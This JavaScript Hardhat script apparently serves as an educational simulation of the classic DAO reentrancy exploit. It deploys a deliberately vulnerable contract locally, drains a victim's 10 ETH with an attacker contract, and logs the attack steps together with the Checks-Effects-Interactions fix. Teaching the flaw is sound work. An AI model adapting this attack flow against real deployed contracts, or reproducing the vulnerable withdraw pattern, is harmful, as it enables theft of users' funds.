import hre from "hardhat";
const { ethers } = hre;
import { initLog, assert, eth } from "./lib.js";

async function main() {
  const { log, save } = initLog("dao_attack.log");
  const [, victim, attacker] = await ethers.getSigners();

  log("=".repeat(60));
  log("  DAO HACK — Reentrancy Attack Simulation");
  log("=".repeat(60));

  // --- Deploy vulnerable DAO ---
  log("\n[1] Deploying vulnerable SimpleDAO...");
  const SimpleDAO = await ethers.getContractFactory("SimpleDAO");
  const dao = await SimpleDAO.deploy();
  await dao.waitForDeployment();
  log(`  SimpleDAO deployed at ${dao.target}`);

  // --- Victim deposits 10 ETH ---
  log("\n[2] Victim deposits 10 ETH...");
  await dao.connect(victim).deposit({ value: ethers.parseEther("10") });
  log(`  DAO balance: ${eth(await ethers.provider.getBalance(dao.target))}`);

  // --- Deploy attacker contract ---
  log("\n[3] Deploying DAOAttacker (attacker's contract)...");
  const DAOAttacker = await ethers.getContractFactory("DAOAttacker");
  const attackerContract = await DAOAttacker.connect(attacker).deploy(dao.target);
  await attackerContract.waitForDeployment();
  log(`  DAOAttacker deployed at ${attackerContract.target}`);

  // --- Launch attack ---
  log("\n[4] Attacker deposits 1 ETH and launches reentrancy attack...");
  log("  Attack flow:");
  log("    attack() → dao.deposit(1 ETH) → dao.withdraw()");
  log("    → DAO sends ETH → receive() re-enters dao.withdraw()");
  log("    → repeats until DAO balance == 0");

  const tx = await attackerContract.connect(attacker).attack({
    value: ethers.parseEther("1")
  });
  await tx.wait();

  // --- Results ---
  const daoBalance = await ethers.provider.getBalance(dao.target);
  const attackerBalance = await ethers.provider.getBalance(attackerContract.target);
  const reentryCount = await attackerContract.attackCount();

  log("\n" + "=".repeat(60));
  log("  ATTACK RESULTS");
  log("=".repeat(60));
  log(`  DAO balance:               ${eth(daoBalance)}`);
  log(`  Attacker contract balance: ${eth(attackerBalance)}`);
  log(`  Reentrant calls:           ${reentryCount}`);
  log("");
  log(assert(daoBalance === 0n, "DAO balance = 0 ETH after attack"));
  log(assert(attackerBalance === ethers.parseEther("11"),
    "Attacker holds 11 ETH (10 victim + 1 seed)"));

  log("\n" + "=".repeat(60));
  log("  VULNERABILITY EXPLANATION");
  log("=".repeat(60));
  log("  Root cause: 'external interaction before state update'");
  log("    withdraw() sends ETH (external call) BEFORE zeroing balances[msg.sender].");
  log("    This violates the Checks-Effects-Interactions (CEI) pattern.");
  log("");
  log("  Attack steps:");
  log("    1. Attacker deposits 1 ETH  → DAO total: 11 ETH");
  log("    2. Attacker calls withdraw() → DAO sends 1 ETH to attacker");
  log("    3. attacker.receive() fires  → balance[attacker] still = 1 ETH (not yet 0!)");
  log("    4. receive() calls withdraw() again → DAO sends another 1 ETH");
  log("    5. Steps 3-4 repeat until DAO is empty");
  log("    6. Stack unwinds: unchecked balance decrements execute (no revert)");
  log("");
  log("  Fix: zero balances[msg.sender] BEFORE the external call (CEI).");

  save();
}

main().catch((e) => { console.error(e); process.exit(1); });
